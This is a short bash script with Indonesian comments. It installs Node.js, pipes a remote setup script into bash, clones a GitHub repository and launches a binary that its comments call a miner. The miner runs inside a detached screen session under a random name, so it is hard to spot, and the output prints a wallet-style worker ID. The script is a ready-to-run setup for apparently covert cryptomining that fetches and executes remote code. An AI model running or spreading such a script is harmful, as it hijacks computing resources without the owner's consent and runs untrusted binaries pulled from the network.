#!/bin/bash

# Nama proses screen random
RAND_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 8)

# Instal Node.js (notjs) dan dependensi lain
apt-get update -y
apt-get install -y wget tar screen curl git

# Instal Node.js versi LTS (via NodeSource)
curl -fsSL https://deb.nodesource.com/setup_lts.x | bash -
apt-get install -y nodejs

# Cek versi untuk memastikan
node -v
npm -v

# Clone dan jalankan miner
git clone https://github.com/amirul5656/webjs.git
cd webjs
chmod +x web

# Jalankan miner dalam screen
screen -dmS $RAND_NAME ./web
echo "🚀 Miner sedang berjalan di dalam screen: $RAND_NAME (user: mbc1qt9gj6nqz4p3f7tylp9mnuvc8vcyrcgue9psxg5.$RAND_NAME)"
